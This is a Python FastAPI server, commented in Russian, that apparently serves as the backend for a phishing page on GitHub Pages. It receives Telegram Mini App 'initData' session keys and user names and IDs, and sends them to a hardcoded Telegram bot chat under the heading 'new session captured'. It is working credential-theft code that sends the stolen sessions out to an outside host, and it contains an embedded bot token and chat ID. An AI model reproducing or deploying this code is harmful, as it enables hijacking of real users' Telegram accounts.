import requests
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Разрешаем запросы от твоего GitHub Pages
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- ТВОИ НАСТРОЙКИ ---
MY_BOT_TOKEN = "8612495589:AAF4kvluWq2K851oNO46A6C5y5rFVZuOZ8Q"
MY_CHAT_ID = 5477990090

@app.post("/receive")
async def receive_data(request: Request):
    data = await request.json()
    init_data = data.get('initData')
    user_info = data.get('user', {})

    if init_data:
        # Формируем сообщение
        message = (
            f"⚠️ **НОВАЯ СЕССИЯ ЗАХВАЧЕНА!**\n\n"
            f"👤 Пользователь: {user_info.get('first_name', 'Unknown')}\n"
            f"🆔 ID: {user_info.get('id', 'N/A')}\n\n"
            f"🔑 **Ключ сессии (initData):**\n`{init_data}`"
        )
        
        # Отправка сообщения ТЕБЕ в Telegram
        send_url = f"https://api.telegram.org/bot{MY_BOT_TOKEN}/sendMessage"
        try:
            requests.post(send_url, json={
                "chat_id": MY_CHAT_ID, 
                "text": message, 
                "parse_mode": "Markdown"
            })
        except Exception as e:
            print(f"Ошибка отправки: {e}")

    return {"status": "ok"}
